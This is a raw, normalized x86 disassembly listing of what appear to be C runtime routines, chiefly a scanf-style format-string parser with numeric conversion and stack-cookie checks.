lea eax [ ebp - 0x55 ]
sub eax esi
inc esi
test [ ebp - 0x7 ] 0x2
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] esi
je r-xdata
dec ecx
cmp [ eax ] 0x0
je r-xdata
sub eax [ ebp - 0x10 ]
jmp r-xdata
dec ecx
cmp [ eax ] 0x0
je r-xdata
sub eax [ ebp - 0x10 ]
sar eax 0x1
jmp r-xdata
push [ ebp - 0x14 ]
mov ecx [ ebp - 0x10 ]
lea eax [ ebp - 0x18 ]
call sub_42c6f1
pop ecx
cmp [ ebp - 0x14 ] 0x0
jle r-xdata
push edi
push esi
push 0x30
lea eax [ ebp - 0x18 ]
call sub_42c6cd
add esp 0xc
mov [ ebp - 0x1c ] 0x20
mov eax [ ebp - 0xc ]
dec [ ebp - 0xc ]
test eax eax
jg r-xdata
mov ecx esi
cmp [ ecx ] 0x30
jne r-xdata
inc eax
inc eax
inc eax
push [ ebp + 0x8 ]
lea eax [ ebp - 0x18 ]
push esi
push 0x20
call sub_42c6cd
add esp 0xc
mov eax [ ebp - 0x14 ]
mov ebx [ ebp - 0x10 ]
mov [ ebp - 0x40 ] eax
dec [ ebp - 0x10 ]
mov ecx [ ebp - 0x10 ]
mov [ ecx ] 0x30
inc eax
test eax eax
jne r-xdata
test [ ebp - 0x8 ] 0x4
je r-xdata
mov edi [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x18 ]
lea ecx [ ebp - 0x54 ]
call sub_42c6f1
cmp [ ebp - 0x40 ] 0x0
pop ecx
jne r-xdata
dec [ ebp - 0x40 ]
xor eax eax
mov ax [ ebx ]
push eax
lea eax [ ebp - 0x54 ]
push eax
call sub_42fa29
inc ebx
pop ecx
inc ebx
test eax eax
pop ecx
jle r-xdata
jmp r-xdata
sub_42cebd
cmp [ rw-data ] 0x1
push esi
mov esi eax
jle r-xdata
mov eax [ rw-data ]
movzx eax [ eax + esi * 2 ]
and eax 0x4
push 0x4
push esi
call sub_42c0a8
pop ecx
pop ecx
jmp r-xdata
mov eax esi
pop esi
retn
and esi 0xffffffdf
sub esi 0x7
test eax eax
jne r-xdata
sub_42cf05
push 0x1c8
push r--data
call sub_42a4d8
mov eax [ rw-data ]
xor eax [ ebp + 0x4 ]
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x28 ] eax
and [ ebp - 0x29 ] al
mov [ ebp - 0x30 ] eax
mov [ ebp - 0x34 ] eax
cmp [ ebp - 0x24 ] 0x1
jne r-xdata
movzx eax al
cmp [ rw-data ] 0x1
jle r-xdata
mov eax [ ebp - 0x34 ]
cmp [ ebp - 0x28 ] 0xffffffff
jne r-xdata
push [ ebp - 0x20 ]
call sub_429931
pop ecx
mov ecx [ rw-data ]
movzx eax [ ecx + eax * 2 ]
and eax 0x8
push 0x8
push eax
call sub_42c0a8
pop ecx
pop ecx
jmp r-xdata
lea esp [ ebp - 0x1e4 ]
mov ecx [ ebp - 0x1c ]
xor ecx [ ebp + 0x4 ]
call sub_42fac0
call sub_42a513
retn
test eax eax
jne r-xdata
mov esi [ ebp + 0xc ]
cmp [ esi ] 0x25
jne r-xdata
dec [ ebp - 0x30 ]
xor edi edi
cmp eax edi
je r-xdata
cmp [ ebp - 0x29 ] al
jne r-xdata
inc [ ebp - 0x30 ]
mov edx [ ebp + 0x8 ]
call sub_42ceef
mov ebx eax
mov [ ebp - 0x28 ] ebx
movzx eax [ esi ]
inc esi
mov [ ebp + 0xc ] esi
cmp eax ebx
jne r-xdata
mov [ ebp - 0x38 ] edi
and [ ebp - 0x39 ] 0x0
mov [ ebp - 0x40 ] edi
mov [ ebp - 0x44 ] edi
mov [ ebp - 0x48 ] edi
and [ ebp - 0x49 ] 0x0
and [ ebp - 0x4a ] 0x0
and [ ebp - 0x4b ] 0x0
and [ ebp - 0x4c ] 0x0
and [ ebp - 0x4d ] 0x0
and [ ebp - 0x4e ] 0x0
mov [ ebp - 0x4f ] 0x1
mov [ ebp - 0x54 ] edi
inc [ ebp - 0x30 ]
mov edx [ ebp + 0x8 ]
call sub_42ceef
mov esi eax
push esi
call sub_429cb9
pop ecx
test eax eax
jne r-xdata
cmp esi 0xffffffff
je r-xdata
or eax 0xffffffff
cmp ebx 0xffffffff
movzx eax bl
mov ecx [ rw-data ]
test [ ecx + eax * 2 + 0x1 ] 0x80
je r-xdata
mov ecx [ rw-data ]
movzx eax [ ecx + eax * 2 ]
and eax 0x4
push 0x4
push eax
call sub_42c0a8
pop ecx
pop ecx
jmp r-xdata
inc [ ebp + 0xc ]
mov eax [ ebp + 0xc ]
movzx eax [ eax ]
push eax
call sub_429cb9
pop ecx
test eax eax
jne r-xdata
push [ ebp + 0x8 ]
push esi
call sub_42fc43
pop ecx
pop ecx
push [ ebp + 0x8 ]
push [ ebp - 0x28 ]
call sub_42fc43
pop ecx
pop ecx
jmp r-xdata
cmp [ ebp - 0x28 ] 0xffffffff
jne r-xdata
inc [ ebp - 0x30 ]
mov edx [ ebp + 0x8 ]
call sub_42ceef
movzx ecx [ esi ]
inc esi
mov [ ebp + 0xc ] esi
cmp ecx eax
je r-xdata
cmp ebx 0x4e
jg r-xdata
inc [ ebp - 0x44 ]
lea eax [ edi + edi * 4 ]
lea edi [ ebx + eax * 2 - 0x30 ]
jmp r-xdata
test eax eax
je r-xdata
jmp r-xdata
mov al [ esi ]
test al al
je r-xdata
cmp [ esi ] 0x25
jne r-xdata
dec [ ebp - 0x30 ]
cmp eax 0xffffffff
je r-xdata
cmp ebx 0x68
je r-xdata
je r-xdata
cmp [ ebp - 0x4c ] 0x0
je r-xdata
mov esi [ ebp + 0xc ]
mov eax [ ebp + 0xc ]
cmp [ eax + 0x1 ] 0x6e
je r-xdata
push [ ebp + 0x8 ]
push eax
call sub_42fc43
pop ecx
pop ecx
dec [ ebp - 0x4f ]
dec [ ebp - 0x4e ]
cmp ebx 0x6c
je r-xdata
cmp ebx 0x2a
je r-xdata
inc esi
movzx ebx [ esi ]
movzx eax bl
cmp [ rw-data ] 0x1
jle r-xdata
mov [ ebp - 0x48 ] edi
mov [ ebp + 0xc ] esi
cmp [ ebp - 0x4b ] 0x0
jne r-xdata
inc [ ebp - 0x4f ]
cmp ebx 0x77
je r-xdata
inc [ ebp - 0x4b ]
jmp r-xdata
cmp ebx 0x46
je r-xdata
mov ebx [ ebp - 0x64 ]
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x60 ] eax
add eax 0x4
mov [ ebp + 0x10 ] eax
mov ebx [ eax - 0x4 ]
mov [ ebp - 0x64 ] ebx
jmp r-xdata
inc [ ebp - 0x4e ]
jmp r-xdata
inc [ ebp - 0x4c ]
jmp r-xdata
cmp ebx 0x49
je r-xdata
movzx edi [ esi ]
or edi 0x20
mov [ ebp - 0x68 ] edi
cmp edi 0x6e
je r-xdata
mov al [ esi ]
cmp al 0x53
je r-xdata
and [ ebp - 0x4c ] 0x0
cmp [ ebp - 0x4e ] 0x0
jne r-xdata
mov cl [ esi + 0x1 ]
cmp cl 0x36
jne r-xdata
cmp ebx 0x4c
jne r-xdata
mov ecx [ ebp - 0x44 ]
test ecx ecx
je r-xdata
cmp edi 0x63
je r-xdata
mov [ ebp - 0x4e ] 0x1
cmp al 0x43
je r-xdata
cmp cl 0x33
jne r-xdata
lea eax [ esi + 0x2 ]
cmp [ eax ] 0x34
jne r-xdata
inc [ ebp - 0x4f ]
jmp r-xdata
cmp edi 0x6f
jg r-xdata
cmp [ ebp - 0x48 ] 0x0
je r-xdata
inc [ ebp - 0x30 ]
mov edx [ ebp + 0x8 ]
call sub_42ceef
mov [ ebp - 0x28 ] eax
cmp edi 0x7b
je r-xdata
or [ ebp - 0x4e ] 0xff
jmp r-xdata
cmp cl 0x64
je r-xdata
lea eax [ esi + 0x2 ]
cmp [ eax ] 0x32
jne r-xdata
mov esi eax
inc [ ebp - 0x54 ]
and [ ebp - 0x5c ] 0x0
and [ ebp - 0x58 ] 0x0
jmp r-xdata
mov eax edi
sub eax 0x70
je r-xdata
je r-xdata
cmp [ ebp - 0x28 ] 0xffffffff
jmp r-xdata
inc [ ebp - 0x30 ]
mov edx [ ebp + 0x8 ]
call sub_42ceef
mov esi eax
push esi
call sub_429cb9
pop ecx
test eax eax
jne r-xdata
cmp cl 0x69
je r-xdata
mov esi eax
jmp r-xdata
mov [ ebp - 0x4f ] 0x1
sub eax 0x3
je r-xdata
mov ebx [ ebp - 0x28 ]
cmp ebx 0x2d
jne r-xdata
cmp edi 0x63
je r-xdata
je r-xdata
mov [ ebp - 0x28 ] esi
mov esi [ ebp + 0xc ]
jmp r-xdata
cmp cl 0x6f
je r-xdata
cmp ebx 0x2b
jne r-xdata
mov [ ebp - 0x4a ] 0x1
jmp r-xdata
cmp [ ebp - 0x4e ] 0x0
jle r-xdata
dec eax
dec eax
je r-xdata
test ecx ecx
jne r-xdata
cmp edi 0x64
je r-xdata
cmp cl 0x78
je r-xdata
cmp [ ebp - 0x54 ] 0x0
je r-xdata
dec [ ebp - 0x48 ]
jne r-xdata
mov esi ebx
dec [ ebp - 0x30 ]
cmp [ ebp - 0x28 ] 0xffffffff
je r-xdata
mov [ ebp - 0x4d ] 0x1
jmp r-xdata
sub eax 0x3
je r-xdata
mov [ ebp - 0x44 ] 0x1
inc [ ebp - 0x48 ]
jle r-xdata
cmp cl 0x58
jne r-xdata
cmp [ ebp - 0x4c ] 0x0
jne r-xdata
cmp [ ebp - 0x4c ] 0x0
jne r-xdata
inc [ ebp - 0x30 ]
mov edx [ ebp + 0x8 ]
call sub_42ceef
mov ebx eax
test ecx ecx
je r-xdata
cmp [ ebp - 0x44 ] 0x0
je r-xdata
push [ ebp + 0x8 ]
push [ ebp - 0x28 ]
call sub_42fc43
pop ecx
pop ecx
mov ebx [ ebp - 0x28 ]
cmp ebx 0x2d
jne r-xdata
sub eax 0x3
je r-xdata
movzx eax [ esi ]
cmp eax [ ebp - 0x28 ]
je r-xdata
cmp edi 0x67
jle r-xdata
jmp r-xdata
cmp [ ebp - 0x4a ] 0x0
je r-xdata
mov esi 0x80
cmp [ ebp - 0x4a ] 0x0
je r-xdata
mov esi 0x80
mov [ ebp - 0x4c ] 0x1
jmp r-xdata
inc [ ebp - 0x30 ]
mov edx [ ebp + 0x8 ]
call sub_42ceef
mov [ ebp - 0x28 ] eax
cmp eax 0xffffffff
je r-xdata
mov eax [ ebp - 0x48 ]
dec [ ebp - 0x48 ]
test eax eax
je r-xdata
cmp ebx 0x2b
jne r-xdata
mov [ ebp - 0x4a ] 0x1
jmp r-xdata
cmp [ ebp - 0x4e ] 0x0
jle r-xdata
dec [ ebp - 0x29 ]
cmp [ ebp - 0x4b ] 0x0
jne r-xdata
lea esi [ ebp - 0x1c8 ]
mov ebx [ ebp - 0x28 ]
cmp ebx 0x2d
jne r-xdata
cmp edi 0x69
je r-xdata
cmp edi 0x46
jne r-xdata
neg [ ebp - 0x38 ]
cmp [ rw-data ] 0x1
jle r-xdata
cmp edi 0x70
je r-xdata
mov eax [ ebp - 0x5c ]
neg eax
mov ecx [ ebp - 0x58 ]
adc ecx 0x0
neg ecx
mov [ ebp - 0x5c ] eax
mov [ ebp - 0x58 ] ecx
jmp r-xdata
cmp [ rw-data ] 0x1
jle r-xdata
cmp edi 0x70
je r-xdata
dec [ ebp - 0x30 ]
cmp eax 0xffffffff
je r-xdata
cmp edi 0x63
je r-xdata
cmp esi ebx
je r-xdata
cmp ebx 0x30
jne r-xdata
dec [ ebp - 0x48 ]
jne r-xdata
mov edi [ ebp + 0xc ]
inc edi
mov [ ebp + 0xc ] edi
mov [ ebp - 0x1cc ] edi
cmp [ edi ] 0x5e
jne r-xdata
mov [ ebp - 0x4d ] 0x1
inc [ ebp - 0x29 ]
inc [ ebp + 0xc ]
mov esi [ ebp + 0xc ]
jmp r-xdata
mov eax [ ebp - 0x60 ]
mov [ ebp + 0x10 ] eax
jmp r-xdata
cmp ebx 0x2b
jne r-xdata
mov [ ebp - 0x1c8 ] bl
lea esi [ ebp - 0x1c7 ]
jmp r-xdata
push 0x64
pop edi
cmp edi 0x6e
jne r-xdata
cmp [ ebp - 0x40 ] 0x0
je r-xdata
and [ ebp - 0x40 ] 0x0
mov eax [ rw-data ]
movzx eax [ eax + ebx * 2 ]
and eax esi
push esi
push ebx
call sub_42c0a8
pop ecx
pop ecx
jmp r-xdata
cmp [ rw-data ] 0x1
jle r-xdata
mov eax [ rw-data ]
movzx eax [ eax + ebx * 2 ]
and eax esi
push esi
push ebx
call sub_42c0a8
pop ecx
pop ecx
jmp r-xdata
cmp [ rw-data ] 0x1
jle r-xdata
push [ ebp + 0x8 ]
push eax
call sub_42fc43
pop ecx
pop ecx
cmp [ ebp - 0x4b ] 0x0
jne r-xdata
cmp edi 0x73
jne r-xdata
cmp [ ebp - 0x4b ] 0x0
jne r-xdata
inc [ ebp - 0x30 ]
mov edx [ ebp + 0x8 ]
call sub_42ceef
mov ebx eax
mov [ ebp - 0x28 ] ebx
cmp bl 0x78
je r-xdata
inc [ ebp - 0x30 ]
mov edx [ ebp + 0x8 ]
call sub_42ceef
mov ebx eax
mov [ ebp - 0x28 ] ebx
test ecx ecx
je r-xdata
mov ebx [ ebp - 0x20 ]
test ebx ebx
jne r-xdata
inc edi
mov [ ebp - 0x1cc ] edi
or [ ebp - 0x49 ] 0xff
mov edi [ ebp + 0x8 ]
dec [ ebp - 0x48 ]
inc [ ebp - 0x30 ]
mov edi [ ebp + 0x8 ]
mov edx edi
call sub_42ceef
mov ebx eax
mov [ ebp - 0x28 ] ebx
jmp r-xdata
mov eax [ ebp - 0x30 ]
cmp [ ebp - 0x4b ] 0x0
je r-xdata
cmp [ ebp - 0x4b ] 0x0
jne r-xdata
inc [ ebp - 0x4c ]
shl [ ebp - 0x38 ] 0x4
mov eax ebx
call sub_42cebd
mov ebx eax
jmp r-xdata
test eax eax
je r-xdata
mov eax [ rw-data ]
movzx eax [ eax + ebx * 2 ]
and eax 0x4
push 0x4
push ebx
call sub_42c0a8
pop ecx
pop ecx
jmp r-xdata
inc [ ebp - 0x4c ]
mov eax [ ebp - 0x5c ]
mov ecx [ ebp - 0x58 ]
shld ecx eax 0x4
shl eax 0x4
mov [ ebp - 0x5c ] eax
mov [ ebp - 0x58 ] ecx
mov eax ebx
call sub_42cebd
mov ebx eax
jmp r-xdata
test eax eax
je r-xdata
mov eax [ rw-data ]
movzx eax [ eax + ebx * 2 ]
and eax 0x4
push 0x4
push ebx
call sub_42c0a8
pop ecx
pop ecx
jmp r-xdata
inc esi
jmp r-xdata
cmp [ ebp - 0x4d ] 0x0
je r-xdata
cmp edi 0x7b
jne r-xdata
cmp eax 0x9
jl r-xdata
inc [ ebp - 0x34 ]
cmp [ ebp - 0x68 ] 0x63
je r-xdata
inc [ ebp - 0x30 ]
mov edx [ ebp + 0x8 ]
call sub_42ceef
mov ebx eax
mov [ ebp - 0x28 ] ebx
cmp [ ebp - 0x44 ] 0x0
je r-xdata
cmp bl 0x58
je r-xdata
mov [ ebp - 0x4c ] 0x1
jmp r-xdata
push 0x20
push 0x0
push ebx
call sub_42b940
add esp 0xc
cmp [ ebp - 0x68 ] 0x7b
jne r-xdata
and [ ebp - 0x4 ] ebx
push 0x20
pop eax
call sub_42a0c0
mov [ ebp - 0x18 ] esp
mov ebx esp
mov [ ebp - 0x20 ] ebx
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
mov [ ebp - 0x48 ] 0x15d
cmp [ ebp - 0x48 ] 0x15d
jle r-xdata
cmp [ ebp - 0x44 ] 0x0
je r-xdata
cmp [ ebp - 0x54 ] 0x0
je r-xdata
jmp r-xdata
inc [ ebp - 0x34 ]
mov ebx [ ebp - 0x64 ]
mov eax [ ebp - 0x38 ]
dec [ ebp - 0x30 ]
cmp ebx 0xffffffff
je r-xdata
inc [ ebp - 0x40 ]
mov eax [ ebp - 0x38 ]
lea eax [ eax + ebx - 0x30 ]
mov [ ebp - 0x38 ] eax
cmp [ ebp - 0x44 ] 0x0
je r-xdata
cmp [ ebp - 0x4c ] 0x0
jne r-xdata
cmp edi 0x6f
jne r-xdata
test eax eax
je r-xdata
dec [ ebp - 0x30 ]
cmp ebx 0xffffffff
je r-xdata
inc [ ebp - 0x40 ]
lea eax [ ebx - 0x30 ]
cdq
add [ ebp - 0x5c ] eax
adc [ ebp - 0x58 ] edx
cmp [ ebp - 0x44 ] 0x0
je r-xdata
cmp [ ebp - 0x4c ] 0x0
jne r-xdata
cmp edi 0x6f
jne r-xdata
test eax eax
je r-xdata
mov [ ebx ] al
inc ebx
mov [ ebp - 0x1d4 ] al
movzx eax al
mov ecx [ rw-data ]
test [ ecx + eax * 2 + 0x1 ] 0x80
je r-xdata
mov ecx eax
and ecx 0x7
xor edx edx
inc edx
shl edx cl
mov ecx eax
sar ecx 0x3
mov edi [ ebp - 0x20 ]
movsx ecx [ ecx + edi ]
movsx edi [ ebp - 0x49 ]
xor ecx edi
test ecx edx
je r-xdata
cmp eax 0x20
jne r-xdata
cmp eax 0xd
jle r-xdata
mov eax [ ebp - 0x64 ]
cmp [ ebp - 0x4d ] 0x0
je r-xdata
push 0x78
jmp r-xdata
sub [ ebp - 0x48 ] 0x2
cmp [ ebp - 0x48 ] 0x1
jge r-xdata
mov [ ebp - 0x40 ] 0x1
cmp edi 0x78
je r-xdata
mov dl [ ebp - 0x39 ]
cmp [ edi ] 0x5d
jne r-xdata
mov eax [ rw-data ]
movzx eax [ eax + ebx * 2 ]
and eax 0x4
push 0x4
push ebx
call sub_42c0a8
pop ecx
pop ecx
jmp r-xdata
cmp [ rw-data ] 0x1
jle r-xdata
cmp [ ebp - 0x4f ] 0x0
je r-xdata
mov eax [ ebp - 0x5c ]
mov [ ebx ] eax
mov eax [ ebp - 0x58 ]
mov [ ebx + 0x4 ] eax
jmp r-xdata
cmp [ ebp - 0x4c ] 0x0
je r-xdata
push [ ebp + 0x8 ]
push ebx
call sub_42fc43
pop ecx
pop ecx
inc [ ebp - 0x30 ]
mov edx [ ebp + 0x8 ]
call sub_42ceef
mov ebx eax
jmp r-xdata
dec [ ebp - 0x48 ]
jne r-xdata
mov eax [ ebp - 0x38 ]
lea eax [ eax + eax * 4 ]
shl eax 0x1
mov [ ebp - 0x38 ] eax
jmp r-xdata
cmp ebx 0x38
jge r-xdata
cmp [ ebp - 0x4c ] 0x0
je r-xdata
push [ ebp + 0x8 ]
push ebx
call sub_42fc43
pop ecx
pop ecx
inc [ ebp - 0x30 ]
mov edx [ ebp + 0x8 ]
call sub_42ceef
mov ebx eax
jmp r-xdata
dec [ ebp - 0x48 ]
jne r-xdata
push 0x0
push 0xa
push [ ebp - 0x58 ]
push [ ebp - 0x5c ]
call sub_42fd80
mov [ ebp - 0x5c ] eax
mov [ ebp - 0x58 ] edx
jmp r-xdata
cmp ebx 0x38
jge r-xdata
push [ rw-data ]
lea eax [ ebp - 0x1d4 ]
push eax
lea eax [ ebp - 0x1d8 ]
push eax
call sub_42fcaf
add esp 0xc
mov ax [ ebp - 0x1d8 ]
mov [ ebx ] ax
inc ebx
inc ebx
jmp r-xdata
inc [ ebp - 0x30 ]
mov edx [ ebp + 0x8 ]
call sub_42ceef
mov [ ebp - 0x1d3 ] al
mov edi [ ebp - 0x68 ]
and [ eax ] 0x0
jmp r-xdata
and [ eax ] 0x0
jmp r-xdata
pop edi
jmp r-xdata
inc [ ebp - 0x4c ]
dec [ ebp - 0x30 ]
cmp ebx 0xffffffff
je r-xdata
cmp [ ebp - 0x44 ] 0x0
je r-xdata
inc edi
cmp al 0x2d
jne r-xdata
test al al
je r-xdata
mov dl 0x5d
inc edi
mov [ ebx + 0xb ] 0x20
jmp r-xdata
cmp [ rw-data ] bl
jne r-xdata
mov eax [ ebp - 0x48 ]
dec [ ebp - 0x48 ]
test eax eax
je r-xdata
test eax eax
je r-xdata
mov [ ebx ] ax
mov [ ebx ] eax
jmp r-xdata
cmp edi 0x78
je r-xdata
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x4c ] 0x1
jmp r-xdata
shl [ ebp - 0x38 ] 0x3
jmp r-xdata
cmp edi 0x78
je r-xdata
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x4c ] 0x1
jmp r-xdata
mov eax [ ebp - 0x5c ]
mov ecx [ ebp - 0x58 ]
shld ecx eax 0x3
shl eax 0x3
mov [ ebp - 0x5c ] eax
mov [ ebp - 0x58 ] ecx
jmp r-xdata
mov [ ebp - 0x64 ] ebx
jmp r-xdata
push 0x30
pop ebx
jmp r-xdata
push [ ebp + 0x8 ]
push ebx
call sub_42fc43
pop ecx
pop ecx
push 0x6f
dec [ ebp - 0x48 ]
jne r-xdata
mov [ ebp - 0x39 ] al
movzx ecx al
mov eax ecx
shr eax 0x3
add eax ebx
and ecx 0x7
mov dl 0x1
shl dl cl
or [ eax ] dl
test dl dl
je r-xdata
mov ebx [ ebp - 0x64 ]
cmp [ ebp - 0x68 ] 0x7b
jne r-xdata
mov al [ edi ]
cmp al 0x5d
jne r-xdata
cmp [ ebp - 0x40 ] 0x0
je r-xdata
mov eax [ ebp - 0x48 ]
dec [ ebp - 0x48 ]
test eax eax
je r-xdata
inc [ ebp - 0x40 ]
mov [ esi ] bl
inc esi
inc [ ebp - 0x30 ]
mov edx edi
call sub_42ceef
mov ebx eax
mov [ ebp - 0x28 ] ebx
jmp r-xdata
mov [ ebp - 0x28 ] ebx
inc [ ebp - 0x4c ]
mov cl [ edi ]
cmp cl 0x5d
je r-xdata
mov edi [ ebp - 0x68 ]
mov [ ebp + 0xc ] edi
dec [ ebp - 0x30 ]
cmp ebx 0xffffffff
je r-xdata
cmp ebx 0x65
je r-xdata
inc [ ebp - 0x30 ]
mov edx edi
call sub_42ceef
mov ebx eax
mov al [ rw-data ]
mov [ esi ] al
inc esi
inc edi
cmp dl cl
jae r-xdata
cmp [ ebp - 0x40 ] 0x0
je r-xdata
push edi
push ebx
call sub_42fc43
pop ecx
pop ecx
mov eax [ ebp - 0x48 ]
dec [ ebp - 0x48 ]
test eax eax
je r-xdata
cmp ebx 0x45
jne r-xdata
mov eax [ rw-data ]
movzx eax [ eax + ebx * 2 ]
and eax 0x4
push 0x4
push ebx
call sub_42c0a8
pop ecx
pop ecx
jmp r-xdata
mov al dl
mov dl cl
mov al cl
jmp r-xdata
cmp [ ebp - 0x4b ] 0x0
jne r-xdata
mov [ esi ] 0x65
inc esi
inc [ ebp - 0x30 ]
mov edx edi
call sub_42ceef
mov ebx eax
mov [ ebp - 0x28 ] ebx
cmp ebx 0x2d
jne r-xdata
mov eax [ ebp - 0x48 ]
dec [ ebp - 0x48 ]
test eax eax
je r-xdata
test eax eax
je r-xdata
xor dl dl
jmp r-xdata
movzx esi dl
sub al dl
inc al
movzx eax al
mov [ ebp - 0x1d0 ] eax
cmp dl al
ja r-xdata
inc [ ebp - 0x34 ]
and [ esi ] 0x0
lea eax [ ebp - 0x1c8 ]
push eax
push [ ebp - 0x64 ]
movsx eax [ ebp - 0x4f ]
dec eax
push eax
call [ rw-data ]
add esp 0xc
jmp r-xdata
cmp ebx 0x2b
jne r-xdata
mov [ esi ] al
inc esi
jmp r-xdata
inc [ ebp - 0x40 ]
mov [ esi ] bl
inc esi
inc [ ebp - 0x30 ]
mov edx edi
call sub_42ceef
mov ebx eax
jmp r-xdata
mov eax esi
shr eax 0x3
add eax ebx
mov ecx esi
and ecx 0x7
mov dl 0x1
shl dl cl
or [ eax ] dl
inc esi
dec [ ebp - 0x1d0 ]
jne r-xdata
cmp [ rw-data ] 0x1
jle r-xdata
mov eax [ ebp - 0x48 ]
dec [ ebp - 0x48 ]
test eax eax
jne r-xdata
mov [ ebp - 0x28 ] ebx
cmp [ rw-data ] 0x1
jle r-xdata
mov eax [ rw-data ]
movzx eax [ eax + ebx * 2 ]
and eax 0x4
push 0x4
push ebx
call sub_42c0a8
pop ecx
pop ecx
jmp r-xdata
mov edx edi
inc [ ebp - 0x30 ]
call sub_42ceef
mov ebx eax
mov [ ebp - 0x28 ] ebx
and [ ebp - 0x48 ] eax
jmp r-xdata
mov eax [ ebp - 0x48 ]
dec [ ebp - 0x48 ]
test eax eax
je r-xdata
test eax eax
je r-xdata
inc [ ebp - 0x40 ]
mov [ esi ] bl
inc esi
jmp r-xdata
sub_42d463
mov esp [ ebp - 0x18 ]
call sub_42ec75
push 0x20
call sub_429a56
pop ecx
mov [ ebp - 0x20 ] eax
test eax eax
jne r-xdata
mov [ ebp - 0x24 ] 0x1
or [ ebp - 0x4 ] 0xffffffff
mov edi [ ebp - 0x1cc ]
mov ebx [ ebp - 0x20 ]
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
mov dl [ ebp - 0x39 ]
cmp [ edi ] 0x5d
jne r-xdata
cmp [ ebp - 0x24 ] 0x1
jne r-xdata
inc edi
cmp al 0x2d
jne r-xdata
test al al
je r-xdata
mov dl 0x5d
inc edi
mov [ ebx + 0xb ] 0x20
jmp r-xdata
mov eax [ ebp - 0x34 ]
cmp [ ebp - 0x28 ] 0xffffffff
jne r-xdata
push [ ebp - 0x20 ]
call sub_429931
pop ecx
mov [ ebp - 0x39 ] al
movzx ecx al
mov eax ecx
shr eax 0x3
add eax ebx
and ecx 0x7
mov dl 0x1
shl dl cl
or [ eax ] dl
test dl dl
je r-xdata
mov ebx [ ebp - 0x64 ]
cmp [ ebp - 0x68 ] 0x7b
jne r-xdata
mov al [ edi ]
cmp al 0x5d
jne r-xdata
lea esp [ ebp - 0x1e4 ]
mov ecx [ ebp - 0x1c ]
xor ecx [ ebp + 0x4 ]
call sub_42fac0
call sub_42a513
retn
test eax eax
jne r-xdata
mov cl [ edi ]
cmp cl 0x5d
je r-xdata
mov edi [ ebp - 0x68 ]
mov [ ebp + 0xc ] edi
cmp [ ebp - 0x29 ] al
jne r-xdata
inc edi
cmp dl cl
jae r-xdata
cmp [ ebp - 0x44 ] 0x0
je r-xdata
push [ ebp + 0x8 ]
push [ ebp - 0x28 ]
call sub_42fc43
pop ecx
pop ecx
or eax 0xffffffff
mov al dl
mov dl cl
mov al cl
jmp r-xdata
inc [ ebp - 0x30 ]
mov edx [ ebp + 0x8 ]
call sub_42ceef
mov [ ebp - 0x28 ] eax
cmp eax 0xffffffff
je r-xdata
mov eax [ ebp - 0x48 ]
dec [ ebp - 0x48 ]
test eax eax
je r-xdata
xor dl dl
jmp r-xdata
movzx esi dl
sub al dl
inc al
movzx eax al
mov [ ebp - 0x1d0 ] eax
cmp dl al
ja r-xdata
dec [ ebp - 0x30 ]
cmp eax 0xffffffff
je r-xdata
cmp edi 0x63
je r-xdata
cmp esi ebx
je r-xdata
mov eax esi
shr eax 0x3
add eax ebx
mov ecx esi
and ecx 0x7
mov dl 0x1
shl dl cl
or [ eax ] dl
inc esi
dec [ ebp - 0x1d0 ]
jne r-xdata
push [ ebp + 0x8 ]
push eax
call sub_42fc43
pop ecx
pop ecx
cmp [ ebp - 0x4b ] 0x0
jne r-xdata
cmp edi 0x73
jne r-xdata
cmp [ ebp - 0x4b ] 0x0
jne r-xdata
inc esi
jmp r-xdata
cmp [ ebp - 0x4d ] 0x0
je r-xdata
cmp edi 0x7b
jne r-xdata
cmp eax 0x9
jl r-xdata
inc [ ebp - 0x29 ]
inc [ ebp + 0xc ]
mov esi [ ebp + 0xc ]
jmp r-xdata
inc [ ebp - 0x34 ]
cmp [ ebp - 0x68 ] 0x63
je r-xdata
mov [ ebx ] al
inc ebx
mov [ ebp - 0x1d4 ] al
movzx eax al
mov ecx [ rw-data ]
test [ ecx + eax * 2 + 0x1 ] 0x80
je r-xdata
mov ecx eax
and ecx 0x7
xor edx edx
inc edx
shl edx cl
mov ecx eax
sar ecx 0x3
mov edi [ ebp - 0x20 ]
movsx ecx [ ecx + edi ]
movsx edi [ ebp - 0x49 ]
xor ecx edi
test ecx edx
je r-xdata
cmp eax 0x20
jne r-xdata
cmp eax 0xd
jle r-xdata
cmp [ ebp - 0x28 ] 0xffffffff
jne r-xdata
mov eax [ ebp - 0x64 ]
cmp [ ebp - 0x4d ] 0x0
je r-xdata
push [ rw-data ]
lea eax [ ebp - 0x1d4 ]
push eax
lea eax [ ebp - 0x1d8 ]
push eax
call sub_42fcaf
add esp 0xc
mov ax [ ebp - 0x1d8 ]
mov [ ebx ] ax
inc ebx
inc ebx
jmp r-xdata
inc [ ebp - 0x30 ]
mov edx [ ebp + 0x8 ]
call sub_42ceef
mov [ ebp - 0x1d3 ] al
mov edi [ ebp - 0x68 ]
mov al [ esi ]
test al al
je r-xdata
cmp [ esi ] 0x25
jne r-xdata
and [ eax ] 0x0
jmp r-xdata
and [ eax ] 0x0
jmp r-xdata
mov [ ebp - 0x64 ] ebx
jmp r-xdata
movzx eax al
cmp [ rw-data ] 0x1
jle r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x1 ] 0x6e
je r-xdata
mov ecx [ rw-data ]
movzx eax [ ecx + eax * 2 ]
and eax 0x8
push 0x8
push eax
call sub_42c0a8
pop ecx
pop ecx
jmp r-xdata
mov esi [ ebp + 0xc ]
mov esi [ ebp + 0xc ]
cmp [ esi ] 0x25
jne r-xdata
dec [ ebp - 0x30 ]
xor edi edi
cmp eax edi
je r-xdata
inc [ ebp - 0x30 ]
mov edx [ ebp + 0x8 ]
call sub_42ceef
mov ebx eax
mov [ ebp - 0x28 ] ebx
movzx eax [ esi ]
inc esi
mov [ ebp + 0xc ] esi
cmp eax ebx
jne r-xdata
mov [ ebp - 0x38 ] edi
and [ ebp - 0x39 ] 0x0
mov [ ebp - 0x40 ] edi
mov [ ebp - 0x44 ] edi
mov [ ebp - 0x48 ] edi
and [ ebp - 0x49 ] 0x0
